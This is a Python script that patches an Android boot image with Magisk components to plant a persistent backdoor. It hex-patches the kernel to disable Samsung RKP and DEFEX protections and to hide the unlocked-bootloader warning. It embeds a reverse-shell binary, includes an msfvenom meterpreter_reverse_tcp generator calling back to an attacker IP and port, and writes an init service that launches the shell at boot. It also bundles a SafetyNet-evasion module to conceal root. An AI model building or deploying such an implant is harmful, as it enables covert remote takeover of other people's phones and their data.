import os
import shutil
from zipfile import ZipFile
import subprocess
import hashlib
import socket
# little kernel patch 08B50E4B7B441B681B68022B0BD0032B 08B5002008BD1B681B68022B0BD0032B (return 0, do not display orange state warning)

def create_workdir(workdir):  # create workdir
    if os.path.exists(workdir):
        shutil.rmtree(workdir)
    os.mkdir(workdir)
    workdir = os.path.abspath(workdir)
    return workdir


def sha1sum(filename):
    h = hashlib.sha1()
    b = bytearray(128 * 1024)
    mv = memoryview(b)
    with open(filename, 'rb', buffering=0) as f:
        for n in iter(lambda: f.readinto(mv), 0):
            h.update(mv[:n])
    return h.hexdigest()


def getip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("10.0.0.0",0))
    return s.getsockname()[0]


class BootPatcher:
    magisk_apk: str
    calling_dir: str
    workdir: str
    bootimg: str
    outbootimg: str
    my_env: dict
    ip: str

    def __init__(self, bootimg, outbootimg="outboot.img", workdir="tmp", magisk_apk="Magisk-v25.2.apk", ip=getip(), port="4444"):
        if not os.path.exists(bootimg):
            raise FileNotFoundError(bootimg)
        if not os.path.exists(magisk_apk):
            raise FileNotFoundError(magisk_apk)

        self.magisk_apk = os.path.abspath(magisk_apk)
        self.bootimg = os.path.abspath(bootimg)
        self.outbootimg = os.path.abspath(outbootimg)

        self.calling_dir = os.getcwd()
        self.workdir = create_workdir(workdir)
        self.extractedFiles = self.workdir + "/extracted"

        # get ip
        self.ip = ip
        self.port = port

    def extract_files(self):
        zip = ZipFile(self.magisk_apk, "r")
        zip.extractall(self.extractedFiles)
        zip.close()

    def copy_files(self):
        shutil.copy(self.extractedFiles + "/lib/x86/libmagiskboot.so", self.workdir + "/magiskboot")
        os.chmod(self.workdir + "/magiskboot", 0o755)
        shutil.copy(self.extractedFiles + "/lib/armeabi-v7a/libmagisk32.so", self.workdir + "/magisk32")
        os.chmod(self.workdir + "/magisk32", 0o755)
        shutil.copy(self.extractedFiles + "/lib/arm64-v8a/libmagisk64.so", self.workdir + "/magisk64")
        os.chmod(self.workdir + "/magisk64", 0o755)
        shutil.copy(self.extractedFiles + "/lib/arm64-v8a/libmagiskinit.so", self.workdir + "/magiskinit")
        os.chmod(self.workdir + "/magiskinit", 0o755)
        shutil.copy(self.extractedFiles + "/lib/arm64-v8a/libbusybox.so", self.workdir + "/busybox")
        os.chmod(self.workdir + "/magiskinit", 0o755)
        shutil.copy(self.extractedFiles + "/lib/arm64-v8a/libmagiskpolicy.so", self.workdir + "/magiskpolicy")
        os.chmod(self.workdir + "/magiskinit", 0o755)

    def unpack(self):
        try:
            subprocess.check_call([self.workdir + "/magiskboot", "unpack", self.bootimg], env=self.my_env)
        except subprocess.CalledProcessError:
            print("Error unpacikng, unsupported image format")
            exit(1)

    def repack(self):
        subprocess.check_call([self.workdir + "/magiskboot", "repack", self.bootimg, self.outbootimg], env=self.my_env)

    def set_env(self):
        self.my_env = {}
        self.my_env["KEEPVERITY"] = "true"
        self.my_env["KEEPFORCEENCRYPT"] = "true"
        self.my_env["PATCHVBMETAFLAG"] = "false"
        self.my_env["RECOVERYMODE"] = "false"

    def create_config(self):
        sha1 = sha1sum(self.bootimg)
        shutil.copy("ramdisk.cpio", "ramdisk.cpio.orig")

        x = open("config", "w")
        x.write("KEEPVERITY=true\n")
        x.write("KEEPFORCEENCRYPT=true\n")
        x.write("PATCHVBMETAFLAG=false\n")
        x.write("RECOVERYMODE=false\n")
        x.write("SHA1={}\n".format(sha1))
        x.close()

    def compress_magisk(self):
        subprocess.check_call([self.workdir + "/magiskboot", "compress=xz", "magisk32", "magisk32.xz"], env=self.my_env)
        subprocess.check_call([self.workdir + "/magiskboot", "compress=xz", "magisk64", "magisk64.xz"], env=self.my_env)

    def magisk_patch_ramdisk(self):
        self.compress_magisk()

        subprocess.check_call([self.workdir + "/magiskboot", "cpio", "ramdisk.cpio",
                               "add 0750 init magiskinit",
                               "mkdir 0750 overlay.d",
                               "mkdir 0750 overlay.d/sbin",
                               "add 0644 overlay.d/sbin/magisk32.xz magisk32.xz",
                               "add 0644 overlay.d/sbin/magisk64.xz magisk64.xz",
                               "patch",
                               "backup ramdisk.cpio.orig",
                               "mkdir 000 .backup",
                               "add 000 .backup/.magisk config"], env=self.my_env)

    def magisk_patch_bin(self):
        for dt in ["dtb", "kernel_dtb"]:
            if os.path.exists(dt):
                subprocess.run([self.workdir + "/magiskboot", "dtb", dt, "patch"], env=self.my_env)

        # Remove Samsung RKP
        subprocess.run([self.workdir + "/magiskboot", "hexpatch", "kernel",
                        "49010054011440B93FA00F71E9000054010840B93FA00F7189000054001840B91FA00F7188010054",
                        "A1020054011440B93FA00F7140020054010840B93FA00F71E0010054001840B91FA00F7181010054"],
                       env=self.my_env)
        # remove samsung defex
        subprocess.run([self.workdir + "/magiskboot", "hexpatch", "kernel", "821B8012", "E2FF8F12"], env=self.my_env)

        # Force kernel to load rootfs
        # skip_initramfs -> want_initramfs
        subprocess.run([self.workdir + "/magiskboot", "hexpatch", "kernel", "736B69705F696E697472616D667300",
                        "77616E745F696E697472616D667300"], env=self.my_env)

    def generate_revshell(self):
        import ipaddress

        subprocess.run(["msfvenom","-p","linux/aarch64/meterpreter_reverse_tcp","-f", "elf","-o",self.workdir+"/payload", "LHOST={}".format(self.ip), "LPORT={}".format(self.port)])
        # subprocess.check_call([self.workdir + "/magiskboot", "compress=xz", "payload", "payload.xz"], env=self.my_env)

    def add_revshell(self):
        subprocess.check_call([self.workdir + "/magiskboot", "cpio", "ramdisk.cpio",
                               "add 0750 overlay.d/sbin/payload ../../bind_shell/libs/arm64-v8a/revshell",
                               "patch"], env=self.my_env)


    def add_modules(self):
        subprocess.check_call([self.workdir + "/magiskboot", "cpio", "ramdisk.cpio",
                               "mkdir 0750 overlay.d/sbin/adb",
                               # magisk bin files
                               "mkdir 0750 overlay.d/sbin/adb/magisk",
                               "add 0750 overlay.d/sbin/adb/magisk/busybox busybox",
                               "add 0750 overlay.d/sbin/adb/magisk/magiskpolicy magiskpolicy",
                                # magisk config db
                             #  "add 0750 overlay.d/sbin/adb/magisk.db ../../modules/adb/magisk.db",
                               "mkdir 0750 overlay.d/sbin/adb/modules",
                               # safety-net fix module
                               "mkdir 0750 overlay.d/sbin/adb/modules/safetynet-fix",
                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/module.prop ../../modules/adb/modules/safetynet-fix/module.prop",
                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/system.prop ../../modules/adb/modules/safetynet-fix/system.prop",
                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/service.sh ../../modules/adb/modules/safetynet-fix/service.sh",
                               "mkdir 0750 overlay.d/sbin/adb/modules/safetynet-fix/zygisk",
                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/zygisk/arm64-v8a.so ../../modules/adb/modules/safetynet-fix/zygisk/arm64-v8a.so",
                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/zygisk/armeabi-v7a.so ../../modules/adb/modules/safetynet-fix/zygisk/armeabi-v7a.so",
                               "add 0750 overlay.d/sbin/adb/modules/safetynet-fix/classes.dex ../../modules/adb/modules/safetynet-fix/classes.dex",
                               # shamiko module
                               #"mkdir 0750 overlay.d/sbin/adb/modules/zygisk_shamiko",
                               #"add 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/module.prop ../../modules/adb/modules/zygisk_shamiko/module.prop",
                               #"add 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/sepolicy.rule ../../modules/adb/modules/zygisk_shamiko/sepolicy.rule",
                               #"add 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/service.sh ../../modules/adb/modules/zygisk_shamiko/service.sh",
                               #"mkdir 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/zygisk",
                               #"add 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/zygisk/arm64-v8a.so ../../modules/adb/modules/zygisk_shamiko/zygisk/arm64-v8a.so",
                               #"add 0750 overlay.d/sbin/adb/modules/zygisk_shamiko/zygisk/armeabi-v7a.so ../../modules/adb/modules/zygisk_shamiko/zygisk/armeabi-v7a.so",
                               # shamiko config (whitelist)
                              # "mkdir 0750 overlay.d/sbin/adb/shamiko",
                              # "add 0750 overlay.d/sbin/adb/shamiko/whitelist ../../modules/adb/shamiko/whitelist",
                               "patch"], env=self.my_env)

    def add_rc_scripts(self):
        # also patches selinux

        # create file
        file = open("payload.rc", "w")
        file.write("service revshell ${MAGISKTMP}/payload\n")
        file.write("    disabled\n")
        file.write("    seclabel u:r:magisk:s0\n")
        file.write("    shutdown critical\n")
        file.write("\n")
        file.write("on property:sys.boot_completed=1\n")
        file.write("   start revshell\n")
        file.close()
        # write file

        subprocess.check_call([self.workdir + "/magiskboot", "cpio", "ramdisk.cpio",
                               "add 0750 overlay.d/custom.rc payload.rc",
                               "patch"], env=self.my_env)

    def custom_patch(self):
       # self.generate_revshell()
        self.add_revshell()
        self.add_modules()
        self.add_rc_scripts()
        return

    def run(self):
        # prepare environment
        self.extract_files()
        self.copy_files()
        os.chdir(self.workdir)

        # patch boot
        self.set_env()

        self.unpack()

        self.create_config()

        self.magisk_patch_ramdisk()
        self.magisk_patch_bin()

        self.custom_patch()

        self.repack()

        os.chdir(self.calling_dir)


def main():
    patcher = BootPatcher("boot.img", magisk_apk="app-debug.apk")
    patcher.run()


if __name__ == "__main__":
    main()
